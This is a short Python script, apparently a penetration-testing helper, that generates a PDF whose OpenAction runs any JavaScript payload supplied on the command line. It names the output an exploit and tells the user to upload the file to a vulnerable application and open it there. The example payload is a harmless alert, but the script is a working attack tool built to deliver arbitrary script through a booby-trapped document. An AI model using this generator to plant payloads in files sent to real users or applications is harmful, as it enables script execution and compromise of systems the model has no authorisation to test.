#!/usr/bin/env python3
import sys

def generate_exploit(payload):
    pdf_content = f"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 6 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj

4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj

5 0 obj
<<
/Length 100
>>
stream
BT
/F1 12 Tf
50 700 Td
({payload}) Tj
ET
endstream
endobj

6 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000070 00000 n
0000000130 00000 n
0000000200 00000 n
0000000270 00000 n
0000000340 00000 n
trailer
<<
/Size 7
/Root 1 0 R
>>
startxref
410
%%EOF"""

    return pdf_content

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 pdf_generator.py <output_file> <javascript_payload>")
        print("Example: python3 pdf_generator.py exploit.pdf \"app.alert(1)\"")
        sys.exit(1)
    
    output_file = sys.argv[1]
    payload = sys.argv[2]
    
    print(f"[+] Creating pdf exploit with payload: {payload}")
    
    pdf_content = generate_exploit(payload)
    
    with open(output_file, "w") as f:
        f.write(pdf_content)
    
    print(f"[+] Exploit PDF created: {output_file}")
    print("[+] Upload pdf file to vulnerable app and open file in app to test")
